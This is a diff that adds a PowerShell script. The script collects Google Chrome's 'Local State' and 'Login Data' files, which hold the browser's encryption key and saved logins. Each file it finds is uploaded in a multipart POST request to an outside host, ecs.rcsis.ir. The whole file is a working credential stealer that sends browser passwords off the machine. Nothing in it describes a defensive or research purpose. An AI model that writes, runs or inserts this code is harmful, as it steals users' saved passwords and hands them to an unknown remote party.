@@ -1,0 +1,46 @@
+# Define the URI with the UID parameters
+$uri = "https://ecs.rcsis.ir/upload?uid={uid}"
+
+# Array of file paths to upload
+$files = @(
+    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State",
+    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+)
+
+# Loop through each file path
+foreach ($filePath in $files) {
+    if (Test-Path $filePath -PathType Leaf) {
+        $fileName = [System.IO.Path]::GetFileName($filePath)
+        $fileContent = Get-Content -Path $filePath -Raw
+
+        # Construct the multipart/form-data content
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        $bodyLines = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
+            "Content-Type: application/octet-stream",
+            "",
+            $fileContent,
+            "--$boundary--",
+            ""
+        ) -join $LF
+
+        # Set headers and content type
+        $headers = @{
+            "Content-Type" = "multipart/form-data; boundary=$boundary"
+        }
+
+        # Send the request
+        $response = Invoke-WebRequest -Uri $uri -Method Post -Body $bodyLines -Headers $headers
+
+        # Check the response status
+        if ($response.StatusCode -eq 200) {
+            Write-Output "File '$fileName' uploaded successfully!"
+        } else {
+            Write-Output "Failed to upload file '$fileName'. Status code: $($response.StatusCode)"
+        }
+    } else {
+        Write-Output "File not found: $filePath"
+    }
+}
